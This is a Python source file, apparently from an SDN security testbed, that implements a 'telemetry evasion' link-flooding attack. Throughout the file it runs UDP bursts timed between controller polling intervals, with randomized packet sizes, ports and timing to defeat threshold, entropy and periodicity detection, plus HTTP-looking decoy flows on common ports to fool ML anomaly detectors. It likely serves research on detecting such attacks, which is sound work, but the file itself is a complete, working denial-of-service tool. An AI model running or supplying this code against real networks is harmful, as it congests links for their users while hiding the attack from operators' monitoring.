#!/usr/bin/env python3
"""
=============================================================================
ATTACK C: Telemetry Evasion LFA
=============================================================================
An advanced LFA that evades SDN controller telemetry/detection by:
  1. Generating burst traffic within polling intervals
  2. Randomizing attack intervals to avoid threshold detection
  3. Using variable packet sizes (avoids entropy-based detection)
  4. Stealth flows that mimic normal traffic patterns

SDN controllers poll statistics every N seconds (typically 2-10s).
This attack exploits the gap between polling intervals:
  - Sends burst within one polling window
  - Goes silent before next poll → controller sees "normal" avg rate
  - Net effect: bottleneck link is congested even though avg rate is low

Traffic characteristics that differ from traditional LFA:
  - Burstiness index > 0.8 (high burst-to-average ratio)
  - Short inter-burst idle periods timed to polling cycles
  - Variable packet sizes (defeats size-based signature detection)
  - Randomized flow tuple (defeats per-flow rate limiting)

Usage:
    python3 attacks/telemetry_evasion_lfa.py \
        --target 10.2.0.2 \
        --poll-interval 2 \
        --duration 120
=============================================================================
"""

import time
import random
import socket
import struct
import threading
import argparse
import logging
import math
from collections import deque

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [TELEMETRY-EVASION] %(message)s'
)
LOG = logging.getLogger('TelemetryEvasion')


class BurstTrafficPattern:
    """
    Generates burst traffic timed to exploit SDN polling intervals.

    The burst window is set to (polling_interval - epsilon) seconds,
    ensuring the burst completes before the controller's next poll,
    causing the time-averaged statistics to appear normal.
    """

    def __init__(self, target_ip: str, target_port: int,
                 poll_interval: float, burst_rate_pps: int,
                 burst_fraction: float = 0.7):
        """
        Args:
            target_ip       : Destination IP (decoy/bottleneck)
            target_port     : Destination port
            poll_interval   : Controller polling interval (seconds)
            burst_rate_pps  : Packets per second during burst
            burst_fraction  : Fraction of poll interval to burst (0.0-1.0)
        """
        self.target_ip      = target_ip
        self.target_port    = target_port
        self.poll_interval  = poll_interval
        self.burst_rate_pps = burst_rate_pps
        self.burst_duration = poll_interval * burst_fraction
        self.idle_duration  = poll_interval * (1.0 - burst_fraction)
        self.running        = False
        self.packets_sent   = 0
        self.cycles_done    = 0

    def _burst_cycle(self):
        """Execute one burst-idle cycle."""
        # ── Burst phase ───────────────────────────────────────────
        LOG.debug('Burst phase: %.2fs at %d pps', self.burst_duration, self.burst_rate_pps)
        burst_start = time.time()
        interval    = 1.0 / self.burst_rate_pps

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() - burst_start < self.burst_duration:
            # Variable packet size: 64..1500 bytes (randomized to defeat entropy detection)
            pkt_size = random.choice([64, 128, 256, 512, 768, 1024, 1400, 1500])
            payload  = random.randbytes(pkt_size - 28)  # subtract IP+UDP header

            # Random source port (randomized 5-tuple defeats per-flow rate limits)
            sock.sendto(payload, (self.target_ip, self.target_port))
            self.packets_sent += 1
            time.sleep(interval)
        sock.close()

        # ── Idle phase (controller polls here, sees "normal" rate) ──
        LOG.debug('Idle phase: %.2fs (controller will poll during this window)',
                  self.idle_duration)
        time.sleep(self.idle_duration)
        self.cycles_done += 1

    def run(self, total_duration: float):
        """Run burst-idle cycles for total_duration seconds."""
        self.running = True
        LOG.info('Burst pattern: poll=%.1fs  burst=%.1fs  idle=%.1fs  rate=%dpps',
                 self.poll_interval, self.burst_duration,
                 self.idle_duration, self.burst_rate_pps)

        start = time.time()
        while self.running and (time.time() - start) < total_duration:
            self._burst_cycle()

        LOG.info('Burst pattern done: %d cycles, %d packets',
                 self.cycles_done, self.packets_sent)

    def stop(self):
        self.running = False


class StealthFlowGenerator:
    """
    Generates flows that mimic normal traffic patterns to evade
    ML-based anomaly detectors that look for high entropy or
    unusual flow-count distributions.
    """

    def __init__(self, target_ip: str, duration: int):
        self.target_ip = target_ip
        self.duration  = duration

        # Pool of ports that look like legitimate traffic
        self.legitimate_ports = [80, 443, 8080, 8443, 22, 21, 25, 110, 993]

    def generate_stealth_flow(self):
        """Send one short-lived flow that resembles legitimate traffic."""
        dst_port = random.choice(self.legitimate_ports)
        payload_size = random.randint(100, 1400)
        payload = b'GET / HTTP/1.1\r\nHost: target\r\n\r\n' + b'\x00' * max(0, payload_size - 38)

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target_ip, dst_port))
            sock.send(payload[:1024])
            sock.close()
        except (socket.error, ConnectionRefusedError, socket.timeout):
            # Send UDP if TCP fails
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload[:512], (self.target_ip, dst_port))
                sock.close()
            except socket.error:
                pass

    def run(self):
        """Generate stealth flows with realistic inter-arrival times."""
        LOG.info('Stealth flow generator → %s (dur=%ds)', self.target_ip, self.duration)
        start = time.time()
        flows_sent = 0

        while time.time() - start < self.duration:
            # Inter-flow time: Poisson distributed (realistic)
            iat = random.expovariate(10)  # avg 10 flows/sec
            time.sleep(iat)
            self.generate_stealth_flow()
            flows_sent += 1

        LOG.info('Stealth flows complete: %d flows', flows_sent)


class RandomizedIntervalAttack:
    """
    Randomizes attack timing to prevent periodicity detection.
    Uses Weibull distribution for inter-burst intervals.
    """

    def __init__(self, target_ip: str, burst_pps: int,
                 min_interval: float, max_interval: float, duration: int):
        self.target_ip    = target_ip
        self.burst_pps    = burst_pps
        self.min_interval = min_interval
        self.max_interval = max_interval
        self.duration     = duration
        self.running      = False

    def _random_interval(self) -> float:
        """Weibull-distributed interval (mimics natural network bursts)."""
        k     = 1.5   # shape parameter
        scale = (self.min_interval + self.max_interval) / 2
        val   = random.weibullvariate(scale, k)
        return max(self.min_interval, min(self.max_interval, val))

    def _send_burst(self, burst_dur: float):
        """Send a short burst of UDP packets."""
        sock     = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        interval = 1.0 / self.burst_pps
        end      = time.time() + burst_dur

        while time.time() < end:
            sz  = random.randint(64, 1400)
            pkt = random.randbytes(sz)
            try:
                port = random.randint(1024, 65535)
                sock.sendto(pkt, (self.target_ip, port))
            except socket.error:
                pass
            time.sleep(interval)
        sock.close()

    def run(self):
        """Run randomized attack for self.duration seconds."""
        self.running = True
        LOG.info('Randomized interval attack → %s  pps=%d  dur=%ds',
                 self.target_ip, self.burst_pps, self.duration)

        start = time.time()
        burst_count = 0

        while self.running and (time.time() - start) < self.duration:
            # Randomized burst duration (1-3 seconds)
            burst_dur  = random.uniform(1.0, 3.0)
            self._send_burst(burst_dur)
            burst_count += 1

            # Random idle before next burst
            idle = self._random_interval()
            LOG.debug('Burst #%d done (%.1fs). Idle for %.2fs', burst_count, burst_dur, idle)
            time.sleep(idle)

        LOG.info('Randomized attack done: %d bursts', burst_count)

    def stop(self):
        self.running = False


class TelemetryEvasionLFA:
    """
    Orchestrates all evasion components simultaneously.
    """

    def __init__(self, target_ip: str, poll_interval: float,
                 duration: int, num_threads: int = 4):
        self.target_ip     = target_ip
        self.poll_interval = poll_interval
        self.duration      = duration
        self.num_threads   = num_threads

    def run(self):
        LOG.info('╔══════════════════════════════════════════╗')
        LOG.info('║   Telemetry Evasion LFA Attack           ║')
        LOG.info('╚══════════════════════════════════════════╝')
        LOG.info('  Target         : %s', self.target_ip)
        LOG.info('  Poll interval  : %.1fs', self.poll_interval)
        LOG.info('  Duration       : %ds', self.duration)
        LOG.info('  Evasion tactics: burst-timing + stealth-flows + randomized-intervals')

        components = [
            # (class, kwargs)
            (BurstTrafficPattern, {
                'target_ip'      : self.target_ip,
                'target_port'    : 8080,
                'poll_interval'  : self.poll_interval,
                'burst_rate_pps' : 2000,
                'burst_fraction' : 0.65
            }),
            (StealthFlowGenerator, {
                'target_ip': self.target_ip,
                'duration' : self.duration
            }),
            (RandomizedIntervalAttack, {
                'target_ip'    : self.target_ip,
                'burst_pps'    : 1500,
                'min_interval' : 0.5,
                'max_interval' : 3.0,
                'duration'     : self.duration
            }),
        ]

        threads = []
        for cls, kwargs in components:
            obj = cls(**kwargs)
            if hasattr(obj, 'run'):
                if cls == BurstTrafficPattern:
                    t = threading.Thread(
                        target=obj.run, args=(self.duration,), daemon=True)
                else:
                    t = threading.Thread(target=obj.run, daemon=True)
                threads.append(t)
                t.start()

        LOG.info('All evasion components running...')
        for t in threads:
            t.join(timeout=self.duration + 10)

        LOG.info('Telemetry Evasion LFA complete.')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Telemetry Evasion LFA')
    parser.add_argument('--target',        default='10.2.0.2', help='Target IP')
    parser.add_argument('--poll-interval', type=float, default=2.0,
                        help='Controller poll interval in seconds (default: 2)')
    parser.add_argument('--duration',      type=int, default=120,
                        help='Attack duration (default: 120s)')
    args = parser.parse_args()

    attack = TelemetryEvasionLFA(
        target_ip    = args.target,
        poll_interval= args.poll_interval,
        duration     = args.duration
    )
    attack.run()
